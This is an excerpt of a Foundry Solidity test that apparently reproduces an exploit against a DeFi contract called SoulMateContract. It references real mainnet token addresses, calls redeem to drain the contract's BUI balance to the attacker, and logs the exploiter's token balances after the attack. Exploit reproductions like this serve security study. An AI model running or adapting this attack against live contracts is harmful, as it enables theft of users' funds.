...
contract ContractTest is Test {
    ...
    IERC20 private constant MATIC =
        IERC20(0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0);
    IERC20 private constant AAVE =
        IERC20(0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9);
    IERC20 private constant ENS =
        IERC20(0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72);
    IERC20 private constant ZRX =
        IERC20(0xE41d2489571d322189246DaFA5ebDe1F4699F498);
    IERC20 private constant UNI =
    ...
    function testExploit() public {
        ...
        SoulMateContract.redeem(
            BUI.balanceOf(address(SoulMateContract)),
            address(this)
        );
        ...
        emit log_named_decimal_uint(
            "Exploiter ENS balance after attack",
            ENS.balanceOf(address(this)),
            ENS.decimals()
        );
        emit log_named_decimal_uint(
            "Exploiter ZRX balance after attack",
            ZRX.balanceOf(address(this)),
            ZRX.decimals()
        );
        emit log_named_decimal_uint(
            "Exploiter UNI balance after attack",
            UNI.balanceOf(address(this)),
            UNI.decimals()
        );
    }
